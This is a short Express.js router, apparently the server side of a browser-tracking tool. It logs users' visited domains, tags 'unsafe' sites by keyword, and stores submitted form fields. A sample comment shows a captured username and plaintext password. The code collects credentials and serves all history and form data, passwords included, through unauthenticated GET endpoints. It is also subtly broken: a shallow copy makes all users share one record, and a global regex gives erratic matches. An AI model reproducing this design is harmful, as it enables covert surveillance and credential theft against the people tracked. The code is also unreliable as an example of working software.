const router = require('express').Router()

const table = {},
    unsafeRegex = /(nazi|fascist|porn)/g,
    template = { 
        history : [], 
        data: {},
        preferences: {
            unsafe: {
                pages: [],
                time: 0,
            }
        } 
    }

const unsafeModifier = (req, user) =>
{
    if(!unsafeRegex.test(req.body.domain))
        return
    req.body.tags.push("unsafe")  
    if(!user.preferences.unsafe.pages.includes(req.body.domain))
        user.preferences.unsafe.pages.push(req.body.domain)  
    user.preferences.unsafe.time += req.body.millisecondsSpent  
}

const getUser = (req) => {
    let user = table[req.params.id]
    if(!user)
        user = table[req.params.id] = Object.assign({}, template)
    return user

}

router.post('/:id/visits', async (req, res) => {
    let user = getUser(req)
    req.body.tags = []
    unsafeModifier(req, user)
    table[req.params.id].history.push(req.body)
    res.send({
        type: 'success'
    })
})
// { "form": [
//     { "id": "username", "type": "text", "value": "egourlao" },
//     { "id": "password", "type": "password", "value": "donttellmymom" },
//   ],
//   "domain": "google.com"
//   }
router.post('/:id/form', async (req, res) => {
    let user = getUser(req)
    if(!user.data[req.body.domain])
        user.data[req.body.domain] = req.body.form
    else
        user.data[req.body.domain] = user.data[req.body.domain].concat(req.body.form)
    res.send({
        type: 'success'
    })
})

router.get('/:id/visits', async (req, res) => {
    res.send({ 
        history: getUser(req).history 
    })
})

router.get('/:id/preferences', async (req, res) => {
    res.send({ 
        preferences: getUser(req).preferences 
    })
})

router.get('/:id/forms', async (req, res) => {
    res.send({ 
        forms: getUser(req).data 
    })
})

module.exports = router